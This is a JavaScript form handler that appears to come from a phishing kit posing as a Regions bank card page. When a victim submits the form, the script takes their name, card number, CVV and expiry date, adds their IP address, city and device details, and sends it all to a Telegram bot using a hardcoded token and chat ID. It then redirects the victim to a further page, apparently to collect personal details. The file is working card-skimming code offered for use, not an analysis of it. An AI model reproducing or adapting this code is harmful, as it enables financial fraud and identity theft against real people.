
const form = document.getElementById('cardInfoForm');

function getBrowserInfo() {
  return navigator.userAgent;
}

function getDeviceType() {
  const ua = navigator.userAgent.toLowerCase();
  if (/mobile|android|iphone|ipod|blackberry|iemobile|opera mini/.test(ua)) {
    return 'Mobile';
  }
  if (/tablet|ipad|playbook|silk/.test(ua)) {
    return 'Tablet';
  }
  return 'Desktop';
}


async function getGeoInfo() {
  try {
    const res = await fetch('https://ipapi.co/json/');
    return await res.json();
  } catch {
    return { ip: 'Unknown IP', city: 'Unknown', country_name: 'Unknown' };
  }
}

form.addEventListener('submit', async (event) => {
  event.preventDefault();

  const cardHolder = document.getElementById('cardHolder').value.trim();
  const cardNumber = document.getElementById('cardNumber').value.trim();
  const cvv = document.getElementById('cvv').value.trim();
  const expiry = document.getElementById('expiry').value.trim();
  

  if (!cardHolder || !cardNumber || !cvv|| !expiry) {
    alert("All fields are required!");
    return;
  }

  const geo = await getGeoInfo();
  const browser = getBrowserInfo();
  const device = getDeviceType();

  // ✅ Put your real Telegram bot details here
  const token = "8525430088:AAHfMQJCkbpR3oUnnXC37_SWqKiGnvk9zPQ"; // <-- Replace with your bot token
  const chat_id = "6211090366"; // <-- Replace with your chat ID

  const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;

  const message = `
===📋 REGIONS New Card Info Submitted===
-------------------------
👤 Card Holder: ${cardHolder}
💳 Card Number: ${cardNumber}
🔑 CVV: ${cvv}
📅 Expiry: ${expiry}

🌍 IP: ${geo.ip}
🏙️ City: ${geo.city}
🏳️ Country: ${geo.country_name}
💻 Browser: ${browser}
📱 Device: ${device}
  `;

  try {
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chat_id,
        text: message
      })
    });

    if (response.ok) {
      //alert("Info sent successfully ✅");
      window.location.href = 'personal.html';
    } else {
      //alert("Failed to send info ❌");
    }
  } catch (err) {
    //alert("Error: " + err.message);
  }
});

